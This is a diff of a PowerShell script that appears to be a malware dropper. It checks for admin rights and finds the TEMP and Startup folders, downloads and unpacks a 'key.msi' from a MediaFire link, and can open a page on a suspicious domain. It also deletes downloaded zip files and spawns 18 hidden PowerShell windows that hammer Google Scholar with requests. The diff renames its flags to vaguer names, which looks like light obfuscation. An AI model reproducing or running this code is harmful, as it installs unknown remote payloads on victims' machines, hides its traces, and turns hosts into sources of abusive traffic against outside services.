@@ -111,8 +111,8 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$true;$mediaFire=$true;$p2=$true;$p3=$true;
-if(!($mediaFire) -and !($openUrl)){[Environment]::Exit(0)}
+$runExe=$true;$p1=$true;$p2=$true
+if(!($p1) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
 $tempPath=[System.Environment]::GetEnvironmentVariable('TEMP','Machine')
@@ -122,7 +122,7 @@ $tempPath=[System.Environment]::GetEnvironmentVariable('TEMP','User')
 $startmenuPath=[Environment]::GetFolderPath('Startup')
 }
 if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
-if($mediaFire){
+if($p1){
 $mediaFireUrl="https://www.mediafire.com:443/file/jaaaimvoo0ffanf/"
 $folderName="Key";$exeName="key.msi"
 $zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
@@ -165,7 +165,7 @@ $tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyCon
 $downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
 foreach($zip in $tempZips){Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue}
 if(Test-Path -LiteralPath $downloadZip){Remove-Item -LiteralPath $downloadZip -Force -ErrorAction SilentlyContinue}
-while($true){
+while ($true) {
 try {
 $null = Invoke-RestMethod -Uri "https://urlhaus.abuse.ch:443/browse.php" -Method Get -UserAgent "" -ErrorAction Stop
 }
@@ -175,10 +175,9 @@ break
 }
 }
 }
-if($p3){
 $count = 18
 $command = '
-while($true){
+while ($true) {
 Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent ""
 if ($_.Exception.Response.StatusCode -eq 403){
 break
@@ -188,6 +187,5 @@ break
 1..$count | ForEach-Object{
 Start-Process powershell.exe -WindowStyle Minimized -ArgumentList "-NoExit", "-Command", $command
 }
-}
 [Environment]::Exit(0)
-
+#
